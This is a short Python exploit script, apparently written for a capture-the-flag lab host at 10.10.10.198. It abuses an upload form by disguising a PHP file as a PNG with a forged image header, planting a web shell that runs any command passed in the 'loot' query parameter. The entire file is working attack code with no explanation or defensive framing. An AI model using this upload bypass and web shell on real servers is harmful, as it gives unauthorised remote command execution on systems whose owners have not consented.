import requests

BASE_URL = 'http://10.10.10.198:8080/'
UPLOAD_URL = BASE_URL + "upload.php?id=naiame"

if "__main__" in __name__:
    s = requests.Session()
    s.get(BASE_URL)
    png_header = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png = {'file' : ('naiame_entry.php.png', png_header + '\n' + '<?php echo shell_exec($_GET["loot"]);?>', 'image/png', {'Content-Disposition' : "form-data"})}
    field_data = {'pupload' : 'upload'}
    r1 = s.post(UPLOAD_URL, files = png, data = field_data)
    print("[+] Done")
    print(vars(s))
